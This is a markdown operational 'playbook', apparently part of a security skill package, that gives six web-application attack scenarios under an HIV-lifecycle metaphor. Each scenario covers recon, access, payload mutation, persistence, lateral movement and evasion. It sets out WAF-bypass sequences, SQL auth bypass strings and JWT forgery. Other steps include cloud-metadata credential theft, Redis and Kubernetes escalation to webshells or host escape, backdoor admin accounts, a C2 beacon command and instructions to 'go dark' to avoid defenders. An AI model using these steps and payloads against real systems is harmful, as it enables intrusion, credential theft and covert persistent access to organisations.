# 🧬 HIV Attack Chain Playbook — 6 Scenarios

> Master operational document. For each scenario: recon checklist → access vectors → payload chain → persistence → lateral → evasion overlay → exact tool invocations → go/no-go checkpoints → time budget.

---

## How to Use This Playbook

1. Run `python hiv_score.py` to get viral fitness score
2. Match your target to the closest scenario below
3. Follow the stage sequence — **do not skip Stage 4 (persistence)**
4. Apply evasion overlay at every step
5. Hit a GO/NO-GO checkpoint → if NO-GO, enter latency and resume later

---

## Scenario A: Unauthenticated External, Cloudflare Protected

**Profile:** Standard web app, no login required for initial recon, CF Enterprise WAF, residential IP detection active.

**Viral Fitness Expectation:** 5.5–7.0 (SELECTIVE → FULL_LIFECYCLE)

### Stage 1: gp120 Recon
```
Checklist:
□ Passive: crt.sh subdomain enum, Wayback Machine, GitHub dorking
□ JS bundle extraction: find API endpoints not in sitemap
  cat main.*.js | grep -oP '"\/api\/[^"]*"' | sort -u
□ CF WAF version detection:
  curl -sI https://target.com | grep -i "cf-ray\|server\|cf-cache"
□ Tech stack: whatweb, response headers, cookie names
□ Auth flow: is there login? OAuth? What token format?
□ Rate limit probe: 10 requests → does CF challenge appear?

Tools:
  python hiv_waf_fp.py --target https://target.com
  python -m rat_ghost recon --target https://target.com

Output: receptor_map.json with auth_type, waf_type, api_surface, rate_limit_threshold
```

### Stage 2: gp41 Initial Access (Ranked Vectors)
```
1. Parameter injection via JS-discovered endpoints (not in sitemap → less WAF coverage)
2. GraphQL introspection if GraphQL detected
3. CORS misconfiguration (hunt-cors)
4. Host header injection (hunt-host-header)
5. Cache poisoning via unkeyed headers (hunt-cache-poison)

GO criteria: 200 OK with reflective/behavioral change confirming vuln
NO-GO criteria: 5+ consecutive 403s → ENTER LATENCY (1-3 days)

Tools:
  python hiv_mutator.py --target https://target.com/api/search --param q --type xss --rounds 30
  python rat_h3.py --target target.com --path /api/search?q=PAYLOAD  (CF bypass via H3)
```

### Stage 3: Reverse Transcriptase (Payload Chain Order)
```
CF-specific mutation order:
Round 1:  Direct payload (establish baseline)
Round 2:  URL encode + case randomize
Round 3:  Unicode normalization (\u003c, \u003e)
Round 4:  HTTP/3 delivery (rat_h3.py) — CF WAF often has H3 gap
Round 5:  Fragment across 2 params + param pollution
Round 6:  Non-standard charset (Content-Type: charset=ibm037)
Round 7:  Null byte insertion + double URL encode
Round 8:  Chunked transfer encoding with payload split
Round 9:  gRPC wrapper if gRPC endpoint found
Round 10: WebSocket upgrade → inject after upgrade

If all 10 rounds blocked: switch vector entirely (re-run Stage 2 with next vector)
```

### Stage 4: Integration/Persistence
```
Available tiers for unauthenticated external:
Tier 2A: If CORS allows → steal auth tokens from victim browsers (stored XSS)
Tier 2B: If cache poisoning → poison cache with malicious response (survives deployments)
Tier 3:  If RCE/file-write → webshell
Tier DNS: Subdomain takeover if CNAME found (python hiv_waf_fp.py → check subdomains)

Minimum: Tier 2A or 2B before proceeding
GO DARK immediately after planting: 72h minimum zero activity
```

### Stage 5-6: Infrastructure Abuse + Lateral
```
From cache poisoning: pivot to internal users seeing poisoned responses
From XSS persistence: keylog admin sessions → access admin panel
From admin access: SSRF to internal APIs (no WAF internally)
  python rat_h3.py --target internal.target.com --path /admin/api/users

Lateral paths:
- SSO: use admin session for all apps on same SSO
- OAuth: register malicious app if admin has OAuth management
```

**Evasion Overlay:**
- Glycan shield: all Stage 2-3 requests use rat_ghost.py headers
- Latency: 30-120s delays between rounds
- CD4: if blocked → run hiv_cd4_flood.py for 2h, then retry

**Time Budget:** Day 1-2 recon, Day 3 access, Day 4-5 mutation, Day 6 persist+dark, Day 9+ resume

---

## Scenario B: Authenticated User, API-First App

**Profile:** You have valid user account, API-first architecture (REST/GraphQL), JWT auth, moderate WAF.

**Viral Fitness Expectation:** 7.0–9.0 (FULL_LIFECYCLE)

### Stage 1: gp120 Recon (Authenticated)
```
Checklist:
□ Browse all app features as authenticated user (generate session history)
□ Intercept all API calls: map every endpoint, parameter, header
□ Note: JWT structure? opaque session? cookie attributes?
□ Find: user ID in JWT? Can you predict/enumerate others?
□ GraphQL: dump schema if possible
  POST /graphql {"query": "{__schema{types{name}}}"}
□ Mass assignment probe: add extra fields to every POST
  {"username":"x","role":"admin","isAdmin":true}
□ Find admin endpoints: /api/admin, /api/v2/users/admin, X-Admin-Token header
□ Check: does your token work on other users' resources? (IDOR baseline)

Tools:
  python rat_ghost.py --session cookies.json --target https://target.com/api/
```

### Stage 2: Initial Access Vectors (Ranked for Authenticated)
```
1. IDOR: /api/users/{id} → enumerate or predict other users (hunt-idor)
2. Mass assignment: add role/isAdmin to profile update
3. JWT manipulation: alg:none, weak secret, kid traversal (hunt-jwt-crypto)
4. GraphQL depth attack: nested queries → DoS or auth bypass (hunt-graphql)
5. BOLA: use your token on other users' objects
6. Privilege escalation via forgotten admin parameter

Tools:
  python hiv_mutator.py --target https://target.com/api/user/1 --param id --type idor --rounds 100
  # JWT crack:
  python -c "import jwt; print(jwt.decode(TOKEN, options={'verify_signature':False}))"
```

### Stage 3: Payload Transform (Authenticated Context)
```
Auth context mutations:
- JWT: modify claims → re-sign → try (alg:none or brute weak secret)
- GraphQL: alias batching to bypass rate limits
  {a:sensitiveQuery(id:1) b:sensitiveQuery(id:2) ...x100}
- Mass assignment: vary field names (role, Role, ROLE, _role, role[])
- IDOR: vary ID format (int → UUID → UUID uppercase → base64)
```

### Stage 4: Persistence (Authenticated = More Options)
```
Tier 2 (primary): 
  - Create OAuth app → authorize → persist token (survives password reset)
  - Register webhook → gets called on every relevant event
  - Create API key → secondary credential set
Tier 3 (if RCE found):
  - Webshell via file upload (hunt-file-upload)
Tier 4 (if CI/CD access via admin):
  - Add malicious pipeline step

Tools:
  python rat_oob.py gen webhook → verify webhook receives events
  python hiv_beacon.py --c2 https://your-c2.com --interval 21600
```

### Stage 5-6: Lateral
```
- Other users: IDOR → mass account access → admin account
- Internal APIs: SSRF from admin function
  python rat_h3.py --target target.com --path /api/admin/proxy?url=http://internal/
- Organization pivot: if multi-tenant, IDOR across org boundaries
```

**Time Budget:** Day 1 auth recon, Day 2-3 IDOR/JWT testing, Day 4 persistence, Day 7+ resume

---

## Scenario C: Admin Panel Exposed, Minimal WAF

**Profile:** Admin panel at /admin or admin.target.com, weak or no WAF, auth required but bypassable.

**Viral Fitness Expectation:** 8.0–10.0 (FULL_LIFECYCLE, rapid)

### Stage 1: Recon (Fast)
```
□ Is admin panel indexed? Google: site:target.com inurl:admin
□ Default credentials: admin/admin, admin/password, admin/admin123
□ Password reset: does admin reset email leak token in URL?
□ Auth bypass: SQL auth bypass payloads (hunt-auth-bypass)
□ HTTP methods: does PUT/DELETE work without admin auth?
□ Headers: X-Admin: true, X-Internal: 1, X-Forwarded-For: 127.0.0.1
```

### Stage 2: Initial Access (Direct, Minimal Evasion Needed)
```
1. SQL auth bypass: ' OR '1'='1'-- in admin login
2. Default credentials (30-second test, do first)
3. Password reset poisoning → admin email (hunt-host-header)
4. JWT none algorithm (if JWT visible in cookies)
5. IP whitelist bypass: X-Forwarded-For: 127.0.0.1

Tools:
  python hiv_mutator.py --target https://target.com/admin/login --param password --type sqli --rounds 20
```

### Stage 3: Minimal Mutation (Minimal WAF = Less Needed)
```
Start direct — if no WAF, direct payloads work.
Mutation only if filtering detected.
```

### Stage 4: Persistence (Admin = Maximum Options)
```
Tier 4 (primary — admin access enables everything):
  - Add backdoor admin account
  - Install malicious plugin/extension
  - Modify CI/CD pipeline via admin interface
  - Set up OAuth app with admin scopes
  - Create persistent API key with admin privileges

GO DARK after: immediate, 24h minimum
```

**Time Budget:** Day 1 access (fast), Day 1 persistence, Day 2+ dark, Day 5+ lateral

---

## Scenario D: GraphQL API, No Introspection, Light Filtering

**Profile:** GraphQL endpoint confirmed, introspection disabled, schema unknown, light filtering.

**Viral Fitness Expectation:** 6.0–8.0

### Stage 1: Recon
```
□ Confirm GraphQL: POST /graphql {"query":"{__typename}"} → "Query"
□ Schema recovery without introspection:
  - Extract from JS bundles: grep -oP 'query \w+' bundle.js
  - Use Clairvoyance: python3 clairvoyance.py -u https://target.com/graphql
  - Try common field names: {user{id,email,role,password,token}}
□ Aliases: can you batch multiple queries?
  {a:user(id:1){id} b:user(id:2){id}}
□ Operation names: any different auth on mutations vs queries?
□ Custom directives: @deprecated fields may have less validation
```

### Stage 2: Initial Access
```
1. IDOR via GraphQL object IDs
2. Mass assignment in mutations (add role field)
3. Nested query → IDOR bypass (object inside object)
4. Mutation parameter injection: createUser(name:"x\",admin:true,x:\"")
5. Introspection via alternative field: __Type, __Schema lowercase variants

Tools:
  python hiv_mutator.py --target https://target.com/graphql --param query --type graphql --rounds 40
```

### Stage 3: Mutation for GraphQL
```
GraphQL-specific bypasses:
- Alias flood: a1:query... a2:query... (bypass rate per-field limits)
- Fragment injection
- Inline fragments on interfaces
- Query complexity bypass: break into smaller queries
- Batching array: [{"query":"..."},{"query":"..."}]
```

**Time Budget:** Day 1-2 schema recovery, Day 3 access, Day 4 persistence, Day 7+ lateral

---

## Scenario E: Mobile API Backend, Different Security Posture

**Profile:** Mobile app backend API, certificate pinning in app, API often has weaker WAF than web app, different auth flow.

**Viral Fitness Expectation:** 7.0–9.0

### Stage 1: Recon
```
□ APK/IPA decompile: extract hardcoded API keys, endpoints, base URLs
  apktool d app.apk && grep -r "api\|token\|secret" smali/
□ Mobile API base URL often different: api-mobile.target.com, m-api.target.com
□ Mobile headers: X-Platform: ios, X-App-Version, X-Device-ID
□ Certificate: extract from APK or use objection to bypass pinning
□ Mobile tokens: often longer-lived than web sessions
□ Find: is there a debug/beta API endpoint? api-dev.target.com
```

### Stage 2: Initial Access (Mobile-Specific)
```
1. API versioning: /v1/ fully patched, /v2/ beta less hardened
2. Platform header: X-Platform: android may bypass iOS-only restrictions
3. Device ID as auth factor: predictable? (sequential, timestamp-based)
4. Firebase misconfiguration: .firebaseio.com accessible?
5. Deep link abuse: custom URL schemes
6. Mass assignment in mobile-specific endpoints

Tools:
  python rat_ghost.py --platform mobile --target https://api-mobile.target.com
```

### Stage 3: Mobile Payload Mutations
```
Mobile APIs often accept JSON, XML, and sometimes protobuf.
Try Content-Type switching: application/json → text/xml → application/x-protobuf
Mobile apps often less strict on encoding → try direct payloads first
```

**Time Budget:** Day 1 APK recon, Day 2 API mapping, Day 3 access, Day 4 persistence

---

## Scenario F: Internal Admin via SSRF Pivot

**Profile:** SSRF confirmed on external endpoint, internal network reachable, internal admin panels have no auth.

**Viral Fitness Expectation:** 8.5–10.0 (highest impact)

### Stage 1: SSRF Characterization
```
□ Confirm SSRF type: error-based, redirect-based, blind (rat_oob.py)
□ Internal range probe: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
□ Cloud metadata:
  http://169.254.169.254/latest/meta-data/ (AWS)
  http://metadata.google.internal/computeMetadata/v1/ (GCP)
  http://169.254.169.254/metadata/instance (Azure)
□ Port scan via SSRF: timing-based detection of open ports
□ Service fingerprint: Redis? Elasticsearch? Jenkins? Kubernetes?

Tools:
  python rat_oob.py gen --tag ssrf_test
  # Then trigger: url=https://[rat_oob_host]/[tag]
  python rat_oob.py wait --tag ssrf_test
```

### Stage 2: Internal Service Access (No WAF Internally)
```
Priority targets:
1. Cloud metadata → IAM credentials → AWS/GCP/Azure full access
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Kubernetes API: https://kubernetes.default.svc/api/v1/pods
3. Redis: gopher://localhost:6379/_SET session:admin 1
4. Elasticsearch: http://localhost:9200/_cat/indices
5. Jenkins: http://localhost:8080/script → Groovy RCE
6. Internal admin panels: http://internal-admin:8080/admin (no auth)

Tools:
  python rat_h3.py --ssrf-pivot target.com --internal-target 169.254.169.254
```

### Stage 3: No Mutation Needed (Internal = No WAF)
```
Send payloads direct. Internal services rarely have WAF.
Focus on protocol abuse: gopher, dict, ftp for non-HTTP services.
```

### Stage 4: Persistence via SSRF
```
Tier 3: Redis CONFIG SET → write webshell to web directory
Tier 3: K8s API → create privileged pod → escape to host
Tier 4: IAM → create new access key → permanent cloud access
  aws iam create-access-key --user-name [discovered-user]
```

**Time Budget:** Day 1 SSRF confirm + probe, Day 2 internal pivot, Day 2 persistence (fast since no WAF), Day 3+ dark

---

## Universal Go/No-Go Checkpoints

```
At each stage boundary, evaluate:

CONTINUE if:
  ✅ Previous stage objective achieved
  ✅ No incident response indicators
  ✅ Persistence verified (Stage 4+)
  ✅ Alert volume normal (no spike)

ENTER LATENCY if:
  ⚠️  3+ consecutive blocked requests with same pattern
  ⚠️  Unexpected IP block or CAPTCHA appears
  ⚠️  Response times change dramatically (under analysis)
  ⚠️  Error rate increases (defenders may be testing)
  ⚠️  Your test accounts suddenly lose access

ABORT ENGAGEMENT if:
  ❌  Legal/scope boundary approached
  ❌  Out-of-scope systems discovered as only path
  ❌  Persistent 403 across all IP rotations for 48h
  ❌  Target goes offline or shows maintenance (may be hardening)
```

---

*HIV Chain Playbook | Security--Skill by wahyunuriman999*
